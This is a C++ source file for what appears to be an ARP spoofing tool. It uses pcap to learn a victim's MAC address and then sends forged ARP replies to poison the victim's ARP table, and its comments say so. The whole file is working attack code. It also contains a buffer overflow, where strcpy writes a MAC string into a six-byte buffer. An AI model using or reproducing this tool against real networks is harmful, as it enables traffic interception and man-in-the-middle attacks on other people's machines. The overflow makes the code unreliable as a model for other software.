#include "main.h"

void send_arp(int mode, pcap_t *handle, Mac ether_dmac, Mac ether_smac, 
			 Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip)
{
	EthArpPacket packet;

	packet.eth_.dmac_ = ether_dmac;
	packet.eth_.smac_ = ether_smac;
	packet.eth_.type_ = htons(EthHdr::Arp);
	
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);

	packet.arp_.op_ = htons(mode);

	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;

	packet.arp_.smac_ = Mac(arp_smac);
	packet.arp_.sip_ = htonl(Ip(arp_sip));
	packet.arp_.tmac_ = Mac(arp_tmac);
	packet.arp_.tip_ = htonl(Ip(arp_tip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	else
	{
		printf("\n------------------------------\n");
		printf("Arp packet sending succeeded!");
		printf("\n------------------------------\n");
	}
}

void getSenderMac(pcap_t* handle, Mac src_mac, Ip src_ip, char* dst_mac, Ip arp_tip)
{
	send_arp(ArpHdr::Request, handle, Mac("ff:ff:ff:ff:ff:ff"), Mac(src_mac),
		 Mac(src_mac), Ip(src_ip), Mac("00:00:00:00:00:00"), Ip(arp_tip));

	while (true)
		{
			struct pcap_pkthdr *header;
			const u_char *reply_packet;
			int result = pcap_next_ex(handle, &header, &reply_packet);
			if (result != 1)
			{
				continue;
			}
			EthArpPacket *reply = (EthArpPacket *)reply_packet;

			if (ntohs(reply->eth_.type_) == EthHdr::Arp && ntohs(reply->arp_.op_) == ArpHdr::Reply &&
				reply->arp_.sip_ == Ip(htonl(arp_tip)) && reply->arp_.tip_ == Ip(htonl(src_ip)))
			{
				strcpy(dst_mac, std::string(reply->arp_.smac_).c_str());
				break;
			}
		}
}

int main(int argc, char *argv[])
{
	// parameter check
	if (argc < 4 || (argc % 2) != 0)
	{
		usage();
		return -1;
	}
	// for multiple execution
	int iter;
	for (iter = 2; iter <= argc-1; iter += 2)
	{
		printf("Get info..\n\n");
		char *dev = argv[1];
		const char *interfaceName = argv[1];
		// Collecting info for ARP packet
		unsigned char src_mac[6];
		if (getMACAddress(interfaceName, src_mac) == 0)
		{
			printf("src MAC : %02X:%02X:%02X:%02X:%02X:%02X\n",
					src_mac[0], src_mac[1], src_mac[2],
					src_mac[3], src_mac[4], src_mac[5]);
		}
		else
		{
			printf("Failed to get MAC Address.\n");
		}

		 char src_ip[INET_ADDRSTRLEN];
		if (getIPAddress(interfaceName, src_ip) == 0)
		{
			printf("src IP : %s\n",src_ip);
		}
		else
		{
			printf("Failed to get IP address.\n");
		}

		// Open pcap handle
		char errbuf[PCAP_ERRBUF_SIZE];
		pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
		if (handle == nullptr)
		{
			fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
			return -1;
		}

		// Send ARP Request packet for dst_mac(victim MAC address)
		char dst_mac[ETH_ALEN];
		getSenderMac(handle, Mac(src_mac), Ip(src_ip), dst_mac ,Ip(argv[iter]));

		printf("dst MAC : %s\n", dst_mac);
		printf("dst IP : %s\n", argv[iter]);

		// Send ARP Reply packet to falsify victim(sender)'s ARP table
		send_arp(ArpHdr::Reply, handle, Mac(dst_mac), Mac(src_mac), Mac(src_mac), Ip(argv[iter+1]), Mac(dst_mac), Ip(argv[iter]));

		pcap_close(handle);
	}
}
